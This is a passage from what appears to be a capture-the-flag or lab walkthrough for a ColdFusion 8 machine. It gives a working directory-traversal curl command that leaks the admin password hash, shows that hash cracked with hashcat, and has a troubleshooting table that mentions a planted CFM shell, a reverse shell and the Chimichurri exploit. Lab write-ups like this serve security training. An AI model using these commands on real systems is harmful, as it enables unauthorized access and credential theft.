## SECTION 2: Leak the Password Hash

### What we're doing:
Using a directory traversal vulnerability to read the password file.

### Step 2.1: Leak the hash

**Command:**
```bash
curl -s 'http://10.129.1.26:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en' | grep password
```

**What you should see:**
```
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
```

![[Pasted image 20260703085757.png]]

**Explanation:**
- The `locale=../../../../../../../../../` goes up directories from the web root
- `ColdFusion8/lib/password.properties` is where the password is stored
- `%00en` is a null byte that bypasses file extension checks
- The hash is SHA1 of the password

---

### Step 2.2: Crack the hash

**Command:**
```bash
echo "2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03" > hash.txt
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt
```

**What you should see:**
```
2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03:happyday
```

📸 **Screenshot Idea:** Show hashcat cracking the hash

**The password is:** `happyday`

## Common Issues and Solutions

| Problem | Solution |
|---------|----------|
| Curl hangs | Add `--max-time 120` to the command |
| Hash doesn't leak | Try without `%00en` at the end |
| Can't login | Make sure you're using `happyday` as password |
| CFM shell doesn't appear | Check that the scheduled task ran successfully |
| No reverse shell | Check your IP in the command is correct |
| Chimichurri won't download | Use `certutil` instead of copying from SMB |
